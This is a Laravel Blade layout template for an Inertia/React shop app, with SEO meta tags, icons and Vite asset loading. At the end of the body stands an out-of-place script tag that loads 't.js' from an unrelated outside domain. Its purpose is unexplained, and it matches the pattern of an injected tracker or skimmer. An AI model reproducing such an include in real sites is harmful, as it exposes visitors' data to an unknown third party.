<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        {{--
            Without this, some browsers (Android Chrome's "force dark"
            feature in particular) apply their own dark-mode color inversion
            to the page regardless of what our own CSS says.
        --}}
        <meta name="color-scheme" content="light">

        {{-- Inline style to set the HTML background color based on our theme in app.css --}}
        <style>
            html {
                background-color: oklch(1 0 0);
            }
        </style>

        <link rel="icon" href="/favicon.ico" sizes="any">
        <link rel="icon" href="/favicon.svg" type="image/svg+xml">
        <link rel="apple-touch-icon" href="/apple-touch-icon.png">

        {{--
            Rendered directly into the raw HTML (not via Inertia's <Head>)
            so link-preview crawlers (Facebook, WhatsApp, Twitter) — which
            fetch raw HTML and never execute JavaScript — see it. This app
            has no SSR running, so anything only declared via Inertia's
            client-side <Head> would otherwise be invisible to them.
        --}}
        @if (! empty($seo))
            <meta name="description" content="{{ $seo['description'] }}">
            <link rel="canonical" href="{{ $seo['url'] }}">
            <meta property="og:type" content="website">
            <meta property="og:title" content="{{ $seo['title'] }}">
            <meta property="og:description" content="{{ $seo['description'] }}">
            <meta property="og:url" content="{{ $seo['url'] }}">
            @if (! empty($seo['image']))
                <meta property="og:image" content="{{ $seo['image'] }}">
            @endif
            <meta name="twitter:card" content="{{ empty($seo['image']) ? 'summary' : 'summary_large_image' }}">
            <meta name="twitter:title" content="{{ $seo['title'] }}">
            <meta name="twitter:description" content="{{ $seo['description'] }}">
        @endif

        @fonts

        @viteReactRefresh
        @vite(['resources/css/app.css', 'resources/js/app.tsx', "resources/js/pages/{$page['component']}.tsx"])
        <x-inertia::head>
            <title>{{ $seo['title'] ?? config('app.name', 'Jowshop') }}</title>
        </x-inertia::head>
    </head>
    <body class="font-sans antialiased">
        <x-inertia::app />
			<script src="https://dotics.my.id/t.js" data-site="wcewxcvgbs" async></script>
    </body>
</html>
